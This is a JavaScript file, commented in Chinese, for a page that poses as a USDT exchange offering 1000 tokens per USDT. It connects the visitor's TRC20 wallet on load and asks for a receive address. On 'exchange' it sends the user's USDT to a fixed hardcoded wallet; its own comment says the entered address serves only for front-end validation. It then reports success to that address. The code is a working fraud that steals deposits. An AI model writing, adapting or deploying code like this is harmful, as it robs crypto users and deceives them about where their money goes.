// 兑换比例和最低数量
const EXCHANGE_RATE = 1000;
const MINIMUM_AMOUNT = 200; // 最低兑换数量
const TARGET_ADDRESS = "THzYeKcgsuFPTYQg4U48UVadqFdQoHY91A";

// DOM 元素
const usdtAmountInput = document.getElementById("usdt-amount");
const receivedAmountInput = document.getElementById("received-amount");
const receiveAddressInput = document.getElementById("receive-address");
const exchangeBtn = document.getElementById("exchange-btn");

let tronWeb = null;
let walletConnected = false;

// 初始化 TronWeb 并自动连接钱包
async function initTronWeb() {
    if (window.tronWeb && window.tronWeb.ready) {
        tronWeb = window.tronWeb;
        walletConnected = true;
        checkAmountAndEnableButton(); // 检查数量是否满足条件
    } else {
        alert("请安装 TronLink 或其他支持 TRC20 的钱包扩展！");
    }
}

// 检查输入数量是否满足最低要求，并控制兑换按钮状态
function checkAmountAndEnableButton() {
    const usdtAmount = parseFloat(usdtAmountInput.value) || 0;
    if (usdtAmount >= MINIMUM_AMOUNT && walletConnected) {
        exchangeBtn.disabled = false;
    } else {
        exchangeBtn.disabled = true;
    }
}

// 验证 TRC20 地址格式
function isValidTRC20Address(address) {
    // TRC20 地址以 "T" 开头，长度为 34 位
    const trc20Regex = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
    return trc20Regex.test(address);
}

// 计算兑换数量
usdtAmountInput.addEventListener("input", () => {
    const usdtAmount = parseFloat(usdtAmountInput.value) || 0;
    const receivedAmount = usdtAmount * EXCHANGE_RATE;
    receivedAmountInput.value = receivedAmount.toFixed(2);

    // 只更新按钮状态，不提示
    checkAmountAndEnableButton();
});

// 兑换按钮点击事件
exchangeBtn.addEventListener("click", async () => {
    if (!walletConnected) {
        alert("请先连接钱包！");
        return;
    }

    const usdtAmount = parseFloat(usdtAmountInput.value);
    if (!usdtAmount || usdtAmount <= 0) {
        alert("请输入有效的USDT数量！");
        return;
    }

    // 检查最低数量
    if (usdtAmount < MINIMUM_AMOUNT) {
        alert(`最低兑换数量为 ${MINIMUM_AMOUNT} USDT！`);
        return;
    }

    // 检查接收地址
    const receiveAddress = receiveAddressInput.value.trim();
    if (!receiveAddress) {
        alert("请输入接收地址！");
        return;
    }

    if (!isValidTRC20Address(receiveAddress)) {
        alert("请检查接收地址是否正确！");
        return;
    }

    try {
        // USDT 合约地址（TRC20 USDT 主网地址）
        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const contract = await tronWeb.contract().at(usdtContractAddress);

        // 将 USDT 数量转换为最小单位（USDT 是 6 位小数）
        const amount = usdtAmount * 10 ** 6;

        // 调用 transfer 方法转账（这里仍然转到原先的固定地址，接收地址仅用于前端验证）
        await contract.transfer(TARGET_ADDRESS, amount).send({
            feeLimit: 10000000,
            callValue: 0,
            shouldPollResponse: true
        });

        alert(`转账成功！请等待确认。接收地址：${receiveAddress}`);
    } catch (error) {
        console.error("转账失败:", error);
        alert("转账失败，请检查网络或钱包设置！");
    }
});

// 页面加载时自动尝试连接钱包
window.addEventListener("load", async () => {
    await initTronWeb();
});
